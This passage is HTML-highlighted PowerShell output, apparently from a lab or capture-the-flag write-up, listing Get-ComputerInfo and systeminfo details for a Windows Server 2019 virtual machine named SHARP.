</span><span class="n">BiosSystemBiosMinorVersion</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">6</span><span class="w">
</span><span class="n">BiosTargetOperatingSystem</span><span class="w">                               </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">BiosVersion</span><span class="w">                                             </span><span class="p">:</span><span class="w"> </span><span class="nx">INTEL</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">6040000</span><span class="w">
</span><span class="n">CsAdminPasswordStatus</span><span class="w">                                   </span><span class="p">:</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
</span><span class="n">CsAutomaticManagedPagefile</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsAutomaticResetBootOption</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsAutomaticResetCapability</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsBootOptionOnLimit</span><span class="w">                                     </span><span class="p">:</span><span class="w"> </span><span class="nx">DoNotReboot</span><span class="w">
</span><span class="n">CsBootOptionOnWatchDog</span><span class="w">                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">DoNotReboot</span><span class="w">
</span><span class="n">CsBootROMSupported</span><span class="w">                                      </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsBootStatus</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="o">...</span><span class="p">}</span><span class="w">
</span><span class="n">CsBootupState</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">Normal</span><span class="w"> </span><span class="nx">boot</span><span class="w">
</span><span class="n">CsCaption</span><span class="w">                                               </span><span class="p">:</span><span class="w"> </span><span class="nx">SHARP</span><span class="w">
</span><span class="n">CsChassisBootupState</span><span class="w">                                    </span><span class="p">:</span><span class="w"> </span><span class="nx">Safe</span><span class="w">
</span><span class="n">CsChassisSKUNumber</span><span class="w">                                      </span><span class="p">:</span><span class="w">
</span><span class="n">CsCurrentTimeZone</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">60</span><span class="w">
</span><span class="n">CsDaylightInEffect</span><span class="w">                                      </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsDescription</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">AT/AT</span><span class="w"> </span><span class="nx">COMPATIBLE</span><span class="w">
</span><span class="n">CsDNSHostName</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">Sharp</span><span class="w">
</span><span class="n">CsDomain</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="nx">WORKGROUP</span><span class="w">
</span><span class="n">CsDomainRole</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="nx">StandaloneServer</span><span class="w">
</span><span class="n">CsEnableDaylightSavingsTime</span><span class="w">                             </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsFrontPanelResetStatus</span><span class="w">                                 </span><span class="p">:</span><span class="w"> </span><span class="nx">Unknown</span><span class="w">
</span><span class="n">CsHypervisorPresent</span><span class="w">                                     </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsInfraredSupported</span><span class="w">                                     </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span><span class="n">CsInitialLoadInfo</span><span class="w">                                       </span><span class="p">:</span><span class="w">
</span><span class="n">CsInstallDate</span><span class="w">                                           </span><span class="p">:</span><span class="w">
</span><span class="n">CsKeyboardPasswordStatus</span><span class="w">                                </span><span class="p">:</span><span class="w"> </span><span class="nx">Unknown</span><span class="w">
</span><span class="n">CsLastLoadInfo</span><span class="w">                                          </span><span class="p">:</span><span class="w">
</span><span class="n">CsManufacturer</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">VMware</span><span class="p">,</span><span class="w"> </span><span class="nx">Inc.</span><span class="w">
</span><span class="n">CsModel</span><span class="w">                                                 </span><span class="p">:</span><span class="w"> </span><span class="nx">VMware</span><span class="w"> </span><span class="nx">Virtual</span><span class="w"> </span><span class="nx">Platform</span><span class="w">
</span><span class="n">CsName</span><span class="w">                                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">SHARP</span><span class="w">
</span><span class="n">CsNetworkAdapters</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">Ethernet0</span><span class="p">}</span><span class="w">
</span><span class="n">CsNetworkServerModeEnabled</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">CsNumberOfLogicalProcessors</span><span class="w">                             </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">CsNumberOfProcessors</span><span class="w">                                    </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">CsProcessors</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">AMD</span><span class="w"> </span><span class="nx">EPYC</span><span class="w"> </span><span class="nx">7401P</span><span class="w"> </span><span class="nx">24-Core</span><span class="w"> </span><span class="nx">Processor</span><span class="w">               </span><span class="p">,</span><span class="w"> </span><span class="nx">AMD</span><span class="w"> </span><span class="nx">EPYC</span><span class="w">
                                                          </span><span class="mi">7401</span><span class="n">P</span><span class="w"> </span><span class="nx">24-Core</span><span class="w"> </span><span class="nx">Processor</span><span class="w">               </span><span class="p">}</span><span class="w">
</span><span class="n">CsOEMStringArray</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="p">{[</span><span class="n">MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7</span><span class="p">],</span><span class="w">
                                                          </span><span class="n">Welcome</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Virtual</span><span class="w"> </span><span class="n">Machine</span><span class="p">}</span><span class="w">
</span><span class="n">CsPartOfDomain</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="n">False</span><span class="w">
</span><span class="n">CsPauseAfterReset</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="mi">3932100000</span><span class="w">
</span><span class="n">CsPCSystemType</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="n">Desktop</span><span class="w">
</span><span class="n">CsPCSystemTypeEx</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="n">Desktop</span><span class="w">
</span><span class="n">CsPowerManagementCapabilities</span><span class="w">                           </span><span class="p">:</span><span class="w">
</span><span class="n">CsPowerManagementSupported</span><span class="w">                              </span><span class="p">:</span><span class="w">
</span><span class="n">CsPowerOnPasswordStatus</span><span class="w">                                 </span><span class="p">:</span><span class="w"> </span><span class="n">Disabled</span><span class="w">
</span><span class="n">CsPowerState</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="n">Unknown</span><span class="w">
</span><span class="n">CsPowerSupplyState</span><span class="w">                                      </span><span class="p">:</span><span class="w"> </span><span class="n">Safe</span><span class="w">
</span><span class="n">CsPrimaryOwnerContact</span><span class="w">                                   </span><span class="p">:</span><span class="w">
</span><span class="n">CsPrimaryOwnerName</span><span class="w">                                      </span><span class="p">:</span><span class="w"> </span><span class="n">Administrator</span><span class="w">
</span><span class="n">CsResetCapability</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="n">Other</span><span class="w">
</span><span class="n">CsResetCount</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="nt">-1</span><span class="w">
</span><span class="n">CsResetLimit</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="nt">-1</span><span class="w">
</span><span class="n">CsRoles</span><span class="w">                                                 </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">LM_Workstation</span><span class="p">,</span><span class="w"> </span><span class="nx">LM_Server</span><span class="p">,</span><span class="w"> </span><span class="nx">NT</span><span class="p">,</span><span class="w"> </span><span class="nx">Server_NT</span><span class="p">}</span><span class="w">
</span><span class="n">CsStatus</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="nx">OK</span><span class="w">
</span><span class="n">CsSupportContactDescription</span><span class="w">                             </span><span class="p">:</span><span class="w">
</span><span class="n">CsSystemFamily</span><span class="w">                                          </span><span class="p">:</span><span class="w">
</span><span class="n">CsSystemSKUNumber</span><span class="w">                                       </span><span class="p">:</span><span class="w">
</span><span class="n">CsSystemType</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="nx">x64-based</span><span class="w"> </span><span class="nx">PC</span><span class="w">
</span><span class="n">CsThermalState</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">Safe</span><span class="w">
</span><span class="n">CsTotalPhysicalMemory</span><span class="w">                                   </span><span class="p">:</span><span class="w"> </span><span class="nx">4294430720</span><span class="w">
</span><span class="n">CsPhyicallyInstalledMemory</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">4194304</span><span class="w">
</span><span class="n">CsUserName</span><span class="w">                                              </span><span class="p">:</span><span class="w"> </span><span class="nx">SHARP\lars</span><span class="w">
</span><span class="n">CsWakeUpType</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="nx">PowerSwitch</span><span class="w">
</span><span class="n">CsWorkgroup</span><span class="w">                                             </span><span class="p">:</span><span class="w"> </span><span class="nx">WORKGROUP</span><span class="w">
</span><span class="n">OsName</span><span class="w">                                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">2019</span><span class="w"> </span><span class="nx">Datacenter</span><span class="w">
</span><span class="n">OsType</span><span class="w">                                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">WINNT</span><span class="w">
</span><span class="n">OsOperatingSystemSKU</span><span class="w">                                    </span><span class="p">:</span><span class="w"> </span><span class="nx">DatacenterServerEdition</span><span class="w">
</span><span class="n">OsVersion</span><span class="w">                                               </span><span class="p">:</span><span class="w"> </span><span class="nx">10.0.17763</span><span class="w">
</span><span class="n">OsCSDVersion</span><span class="w">                                            </span><span class="p">:</span><span class="w">
</span><span class="n">OsBuildNumber</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">17763</span><span class="w">
</span><span class="n">OsHotFixes</span><span class="w">                                              </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">KB4580422</span><span class="p">,</span><span class="w"> </span><span class="nx">KB4577667</span><span class="p">,</span><span class="w"> </span><span class="nx">KB4587735</span><span class="p">,</span><span class="w"> </span><span class="nx">KB5000822</span><span class="p">}</span><span class="w">
</span><span class="n">OsBootDevice</span><span class="w">                                            </span><span class="p">:</span><span class="w"> </span><span class="nx">\Device\HarddiskVolume1</span><span class="w">
</span><span class="n">OsSystemDevice</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">\Device\HarddiskVolume2</span><span class="w">
</span><span class="n">OsSystemDirectory</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="w">
</span><span class="n">OsSystemDrive</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">C:</span><span class="w">
</span><span class="n">OsWindowsDirectory</span><span class="w">                                      </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Windows</span><span class="w">
</span><span class="n">OsCountryCode</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span><span class="n">OsCurrentTimeZone</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">60</span><span class="w">
</span><span class="n">OsLocaleID</span><span class="w">                                              </span><span class="p">:</span><span class="w"> </span><span class="nx">0409</span><span class="w">
</span><span class="n">OsLocale</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="nx">en-US</span><span class="w">
</span><span class="n">OsLocalDateTime</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="nx">4/24/2021</span><span class="w"> </span><span class="nx">5:21:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">OsLastBootUpTime</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="nx">4/23/2021</span><span class="w"> </span><span class="nx">3:25:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">OsUptime</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="nx">1.01:55:59.5152867</span><span class="w">
</span><span class="n">OsBuildType</span><span class="w">                                             </span><span class="p">:</span><span class="w"> </span><span class="nx">Multiprocessor</span><span class="w"> </span><span class="nx">Free</span><span class="w">
</span><span class="n">OsCodeSet</span><span class="w">                                               </span><span class="p">:</span><span class="w"> </span><span class="nx">1252</span><span class="w">
</span><span class="n">OsDataExecutionPreventionAvailable</span><span class="w">                      </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">OsDataExecutionPrevention32BitApplications</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">OsDataExecutionPreventionDrivers</span><span class="w">                        </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">OsDataExecutionPreventionSupportPolicy</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">OptOut</span><span class="w">
</span><span class="n">OsDebug</span><span class="w">                                                 </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span><span class="n">OsDistributed</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span><span class="n">OsEncryptionLevel</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">256</span><span class="w">
</span><span class="n">OsForegroundApplicationBoost</span><span class="w">                            </span><span class="p">:</span><span class="w"> </span><span class="nx">Maximum</span><span class="w">
</span><span class="n">OsTotalVisibleMemorySize</span><span class="w">                                </span><span class="p">:</span><span class="w"> </span><span class="nx">4193780</span><span class="w">
</span><span class="n">OsFreePhysicalMemory</span><span class="w">                                    </span><span class="p">:</span><span class="w"> </span><span class="nx">3250652</span><span class="w">
</span><span class="n">OsTotalVirtualMemorySize</span><span class="w">                                </span><span class="p">:</span><span class="w"> </span><span class="nx">4914676</span><span class="w">
</span><span class="n">OsFreeVirtualMemory</span><span class="w">                                     </span><span class="p">:</span><span class="w"> </span><span class="nx">4008532</span><span class="w">
</span><span class="n">OsInUseVirtualMemory</span><span class="w">                                    </span><span class="p">:</span><span class="w"> </span><span class="nx">906144</span><span class="w">
</span><span class="n">OsTotalSwapSpaceSize</span><span class="w">                                    </span><span class="p">:</span><span class="w">
</span><span class="n">OsSizeStoredInPagingFiles</span><span class="w">                               </span><span class="p">:</span><span class="w"> </span><span class="nx">720896</span><span class="w">
</span><span class="n">OsFreeSpaceInPagingFiles</span><span class="w">                                </span><span class="p">:</span><span class="w"> </span><span class="nx">636604</span><span class="w">
</span><span class="n">OsPagingFiles</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">C:\pagefile.sys</span><span class="p">}</span><span class="w">
</span><span class="n">OsHardwareAbstractionLayer</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">10.0.17763.1790</span><span class="w">
</span><span class="n">OsInstallDate</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">11/12/2020</span><span class="w"> </span><span class="nx">4:57:36</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">OsManufacturer</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Corporation</span><span class="w">
</span><span class="n">OsMaxNumberOfProcesses</span><span class="w">                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">4294967295</span><span class="w">
</span><span class="n">OsMaxProcessMemorySize</span><span class="w">                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">137438953344</span><span class="w">
</span><span class="n">OsMuiLanguages</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">en-US</span><span class="p">}</span><span class="w">
</span><span class="n">OsNumberOfLicensedUsers</span><span class="w">                                 </span><span class="p">:</span><span class="w">
</span><span class="n">OsNumberOfProcesses</span><span class="w">                                     </span><span class="p">:</span><span class="w"> </span><span class="nx">65</span><span class="w">
</span><span class="n">OsNumberOfUsers</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span><span class="n">OsOrganization</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">Managed</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">Terraform</span><span class="w">
</span><span class="n">OsArchitecture</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">64-bit</span><span class="w">
</span><span class="n">OsLanguage</span><span class="w">                                              </span><span class="p">:</span><span class="w"> </span><span class="nx">en-US</span><span class="w">
</span><span class="n">OsProductSuites</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">TerminalServices</span><span class="p">,</span><span class="w"> </span><span class="nx">DatacenterEdition</span><span class="p">,</span><span class="w">
                                                          </span><span class="n">TerminalServicesSingleSession</span><span class="p">}</span><span class="w">
</span><span class="n">OsOtherTypeDescription</span><span class="w">                                  </span><span class="p">:</span><span class="w">
</span><span class="n">OsPAEEnabled</span><span class="w">                                            </span><span class="p">:</span><span class="w">
</span><span class="n">OsPortableOperatingSystem</span><span class="w">                               </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span><span class="n">OsPrimary</span><span class="w">                                               </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">OsProductType</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">Server</span><span class="w">
</span><span class="n">OsRegisteredUser</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">
</span><span class="n">OsSerialNumber</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">00430-10710-91142-AA482</span><span class="w">
</span><span class="n">OsServicePackMajorVersion</span><span class="w">                               </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">OsServicePackMinorVersion</span><span class="w">                               </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">OsStatus</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="nx">OK</span><span class="w">
</span><span class="n">OsSuites</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">TerminalServices</span><span class="p">,</span><span class="w"> </span><span class="nx">DatacenterEdition</span><span class="p">,</span><span class="w">
                                                          </span><span class="n">TerminalServicesSingleSession</span><span class="p">}</span><span class="w">
</span><span class="n">OsServerLevel</span><span class="w">                                           </span><span class="p">:</span><span class="w"> </span><span class="nx">ServerCore</span><span class="w">
</span><span class="n">KeyboardLayout</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">en-US</span><span class="w">
</span><span class="n">TimeZone</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">UTC</span><span class="o">+</span><span class="nx">00:00</span><span class="p">)</span><span class="w"> </span><span class="n">Dublin</span><span class="p">,</span><span class="w"> </span><span class="nx">Edinburgh</span><span class="p">,</span><span class="w"> </span><span class="nx">Lisbon</span><span class="p">,</span><span class="w"> </span><span class="nx">London</span><span class="w">
</span><span class="n">LogonServer</span><span class="w">                                             </span><span class="p">:</span><span class="w"> </span><span class="nx">\\SHARP</span><span class="w">
</span><span class="n">PowerPlatformRole</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">Desktop</span><span class="w">
</span><span class="n">HyperVisorPresent</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">HyperVRequirementDataExecutionPreventionAvailable</span><span class="w">       </span><span class="p">:</span><span class="w">
</span><span class="n">HyperVRequirementSecondLevelAddressTranslation</span><span class="w">          </span><span class="p">:</span><span class="w">
</span><span class="n">HyperVRequirementVirtualizationFirmwareEnabled</span><span class="w">          </span><span class="p">:</span><span class="w">
</span><span class="n">HyperVRequirementVMMonitorModeExtensions</span><span class="w">                </span><span class="p">:</span><span class="w">
</span><span class="n">DeviceGuardSmartStatus</span><span class="w">                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">Off</span><span class="w">
</span><span class="n">DeviceGuardRequiredSecurityProperties</span><span class="w">                   </span><span class="p">:</span><span class="w">
</span><span class="n">DeviceGuardAvailableSecurityProperties</span><span class="w">                  </span><span class="p">:</span><span class="w">
</span><span class="n">DeviceGuardSecurityServicesConfigured</span><span class="w">                   </span><span class="p">:</span><span class="w">
</span><span class="n">DeviceGuardSecurityServicesRunning</span><span class="w">                      </span><span class="p">:</span><span class="w">
</span><span class="n">DeviceGuardCodeIntegrityPolicyEnforcementStatus</span><span class="w">         </span><span class="p">:</span><span class="w">
</span><span class="n">DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></pre></table></code></div></div><p>//sharp, 64-bit</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">systeminfo</span><span class="w">

</span><span class="n">Host</span><span class="w"> </span><span class="nx">Name:</span><span class="w">                 </span><span class="nx">SHARP</span><span class="w">
</span><span class="n">OS</span><span class="w"> </span><span class="nx">Name:</span><span class="w">                   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">2019</span><span class="w"> </span><span class="nx">Datacenter</span><span class="w">
</span><span class="n">OS</span><span class="w"> </span><span class="nx">Version:</span><span class="w">                </span><span class="nx">10.0.17763</span><span class="w"> </span><span class="nx">N/A</span><span class="w"> </span><span class="nx">Build</span><span class="w"> </span><span class="nx">17763</span><span class="w">
</span><span class="n">OS</span><span class="w"> </span><span class="nx">Manufacturer:</span><span class="w">           </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Corporation</span><span class="w">
</span><span class="n">OS</span><span class="w"> </span><span class="nx">Configuration:</span><span class="w">          </span><span class="nx">Standalone</span><span class="w"> </span><span class="nx">Server</span><span class="w">
</span><span class="n">OS</span><span class="w"> </span><span class="nx">Build</span><span class="w"> </span><span class="nx">Type:</span><span class="w">             </span><span class="nx">Multiprocessor</span><span class="w"> </span><span class="nx">Free</span><span class="w">
</span><span class="n">Registered</span><span class="w"> </span><span class="nx">Owner:</span><span class="w">          </span><span class="nx">Administrator</span><span class="w">
</span><span class="n">Registered</span><span class="w"> </span><span class="nx">Organization:</span><span class="w">   </span><span class="nx">Managed</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">Terraform</span><span class="w">
</span><span class="n">Product</span><span class="w"> </span><span class="nx">ID:</span><span class="w">                </span><span class="nx">00430-10710-91142-AA482</span><span class="w">
</span><span class="n">Original</span><span class="w"> </span><span class="nx">Install</span><span class="w"> </span><span class="nx">Date:</span><span class="w">     </span><span class="nx">11/12/2020</span><span class="p">,</span><span class="w"> </span><span class="nx">4:57:36</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">System</span><span class="w"> </span><span class="nx">Boot</span><span class="w"> </span><span class="nx">Time:</span><span class="w">          </span><span class="nx">4/23/2021</span><span class="p">,</span><span class="w"> </span><span class="nx">3:25:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">System</span><span class="w"> </span><span class="nx">Manufacturer:</span><span class="w">       </span><span class="nx">VMware</span><span class="p">,</span><span class="w"> </span><span class="nx">Inc.</span><span class="w">
</span><span class="n">System</span><span class="w"> </span><span class="nx">Model:</span><span class="w">              </span><span class="nx">VMware</span><span class="w"> </span><span class="nx">Virtual</span><span class="w"> </span><span class="nx">Platform</span><span class="w">
</span><span class="n">System</span><span class="w"> </span><span class="nx">Type:</span><span class="w">               </span><span class="nx">x64-based</span><span class="w"> </span><span class="nx">PC</span><span class="w">
</span><span class="n">Processor</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="w">              </span><span class="mi">2</span><span class="w"> </span><span class="n">Processor</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="n">Installed.</span><span class="w">
                           </span><span class="p">[</span><span class="mi">01</span><span class="p">]:</span><span class="w"> </span><span class="nx">AMD64</span><span class="w"> </span><span class="nx">Family</span><span class="w"> </span><span class="nx">23</span><span class="w"> </span><span class="nx">Model</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">Stepping</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nx">AuthenticAMD</span><span class="w"> </span><span class="nx">~2000</span><span class="w"> </span><span class="nx">Mhz</span><span class="w">
                           </span><span class="p">[</span><span class="mi">02</span><span class="p">]:</span><span class="w"> </span><span class="n">AMD64</span><span class="w"> </span><span class="nx">Family</span><span class="w"> </span><span class="nx">23</span><span class="w"> </span><span class="nx">Model</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">Stepping</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nx">AuthenticAMD</span><span class="w"> </span><span class="nx">~2000</span><span class="w"> </span><span class="nx">Mhz</span><span class="w">
</span><span class="n">BIOS</span><span class="w"> </span><span class="nx">Version:</span><span class="w">              </span><span class="nx">Phoenix</span><span class="w"> </span><span class="nx">Technologies</span><span class="w"> </span><span class="nx">LTD</span><span class="w"> </span><span class="nx">6.00</span><span class="p">,</span><span class="w"> </span><span class="nx">12/12/2018</span><span class="w">
</span><span class="n">Windows</span><span class="w"> </span><span class="nx">Directory:</span><span class="w">         </span><span class="nx">C:\Windows</span><span class="w">
</span><span class="n">System</span><span class="w"> </span><span class="nx">Directory:</span><span class="w">          </span><span class="nx">C:\Windows\system32</span><span class="w">
</span><span class="n">Boot</span><span class="w"> </span><span class="nx">Device:</span><span class="w">               </span><span class="nx">\Device\HarddiskVolume1</span><span class="w">
</span><span class="n">System</span><span class="w"> </span><span class="nx">Locale:</span><span class="w">             </span><span class="nx">en-us</span><span class="p">;</span><span class="n">English</span><span class="w"> </span><span class="p">(</span><span class="n">United</span><span class="w"> </span><span class="nx">States</span><span class="p">)</span><span class="w">
</span><span class="n">Input</span><span class="w"> </span><span class="nx">Locale:</span><span class="w">              </span><span class="nx">en-us</span><span class="p">;</span><span class="n">English</span><span class="w"> </span><span class="p">(</span><span class="n">United</span><span class="w"> </span><span class="nx">States</span><span class="p">)</span><span class="w">
</span><span class="n">Time</span><span class="w"> </span><span class="nx">Zone:</span><span class="w">                 </span><span class="p">(</span><span class="n">UTC</span><span class="o">+</span><span class="nx">00:00</span><span class="p">)</span><span class="w"> </span><span class="n">Dublin</span><span class="p">,</span><span class="w"> </span><span class="nx">Edinburgh</span><span class="p">,</span><span class="w"> </span><span class="nx">Lisbon</span><span class="p">,</span><span class="w"> </span><span class="nx">London</span><span class="w">
</span><span class="n">Total</span><span class="w"> </span><span class="nx">Physical</span><span class="w"> </span><span class="nx">Memory:</span><span class="w">     </span><span class="nx">4</span><span class="p">,</span><span class="nx">095</span><span class="w"> </span><span class="nx">MB</span><span class="w">
</span><span class="n">Available</span><span class="w"> </span><span class="nx">Physical</span><span class="w"> </span><span class="nx">Memory:</span><span class="w"> </span><span class="nx">3</span><span class="p">,</span><span class="nx">151</span><span class="w"> </span><span class="nx">MB</span><span class="w">
</span><span class="n">Virtual</span><span class="w"> </span><span class="nx">Memory:</span><span class="w"> </span><span class="nx">Max</span><span class="w"> </span><span class="nx">Size:</span><span class="w">  </span><span class="nx">4</span><span class="p">,</span><span class="nx">799</span><span class="w"> </span><span class="nx">MB</span><span class="w">
</span><span class="n">Virtual</span><span class="w"> </span><span class="nx">Memory:</span><span class="w"> </span><span class="nx">Available:</span><span class="w"> </span><span class="nx">3</span><span class="p">,</span><span class="nx">893</span><span class="w"> </span><span class="nx">MB</span><span class="w">
</span><span class="n">Virtual</span><span class="w"> </span><span class="nx">Memory:</span><span class="w"> </span><span class="nx">In</span><span class="w"> </span><span class="nx">Use:</span><span class="w">    </span><span class="nx">906</span><span class="w"> </span><span class="nx">MB</span><span class="w">
</span><span class="n">Page</span><span class="w"> </span><span class="nx">File</span><span class="w"> </span><span class="nx">Location</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="w">     </span><span class="n">C:\pagefile.sys</span><span class="w">
</span><span class="nx">Domain:</span><span class="w">                    </span><span class="nx">WORKGROUP</span><span class="w">
</span><span class="n">Logon</span><span class="w"> </span><span class="nx">Server:</span><span class="w">              </span><span class="nx">\\SHARP</span><span class="w">
